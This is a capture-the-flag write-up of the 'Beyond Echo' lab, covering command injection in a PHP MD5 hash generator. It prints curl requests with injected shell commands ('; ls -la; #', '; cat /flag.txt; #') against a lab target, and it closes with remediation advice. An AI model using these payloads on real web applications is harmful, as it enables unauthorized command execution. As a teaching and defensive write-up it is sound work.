/////











Lab Writeup: Beyond Echo
Platform: HackerDNA


(https://hackerdna.com/labs/beyond-echo

Difficulty: Medium

Vulnerability: PHP Command Injection (RCE)

Executive Summary
The Beyond Echo lab features a web application acting as an Online MD5 Hash Generator. During the assessment, it was discovered that the application passes user-supplied input directly into a system-level shell command without adequate sanitization. By injecting shell metacharacters, an attacker can achieve Remote Code Execution (RCE) under the context of the web server user.

1. Initial Enumeration
Upon navigating to the target IP, the application presents a simple form with one input field: inputText.

Functionality: The user enters text, and the server returns a 32-character MD5 hash.

Hypothesis: The title "Beyond Echo" and the nature of the tool suggest the backend might be using a PHP function like shell_exec() or system() to call the Linux md5sum utility, rather than using PHP’s native md5() function.

2. Vulnerability Discovery
The goal was to break out of the expected input string and execute arbitrary commands. Initial tests with simple command separators were performed.

Test Payload: test; id

Observation: If the backend command is echo [INPUT] | md5sum, a raw semicolon might cause a syntax error or be swallowed by the pipe.

To bypass this, a commenting strategy was used. By adding a semicolon (;) to terminate the intended command and a hash (#) to comment out the rest of the developer's code, we can force the server to execute our payload cleanly.

3. Exploitation (RCE)
Using curl, we sent a payload designed to list the files in the current directory:

Bash

curl -s -X POST http://[TARGET_IP]/index.php \
     --data-urlencode "inputText=test; ls -la; #"
Result:
The server responded with the output of the ls -la command inside the HTML <pre> tags:

Plaintext

total 16
-rw-r--r--. 1 root     root     4179 Apr  5  2024 index.php
This confirmed Remote Code Execution.

4. Post-Exploitation & Enumeration
With a working execution vector, the next step was to find the flag.

Identify User/Environment: Running whoami and pwd confirmed we were operating as www-data in /var/www/html.

Locate Flag: A broad search of the filesystem was conducted. While find returned many system files, a manual check of the root directory proved most fruitful.

Command: test; ls -la /; #

Discovery: A file named flag.txt was located in the root directory (/).

5. Flag Retrieval
The final step was to read the contents of the identified flag file using the cat command.

Final Payload:

Bash

curl -s -X POST http://[TARGET_IP]/index.php \
     --data-urlencode "inputText=test; cat /flag.txt; #"
The contents of the file were echoed back in the response, providing the unique UUID flag required to complete the lab.

6. Remediation Recommendations
To prevent this vulnerability, developers should follow the principle of never trusting user input when interacting with the system shell.

Primary Fix: Use native language functions. In PHP, use the built-in md5() function instead of calling an external OS command.

Secondary Fix: If shell execution is absolutely necessary, use escapeshellarg() to escape all user input. This ensures the shell treats the input as a single literal string rather than executable code.

Secure Code Example:

PHP

$input = $_POST['inputText'];
$safe_input = escapeshellarg($input);
// The shell now treats $safe_input as a literal argument
$output = shell_exec("echo " . $safe_input . " | md5sum");
Status: Completed

Points Earned: 20
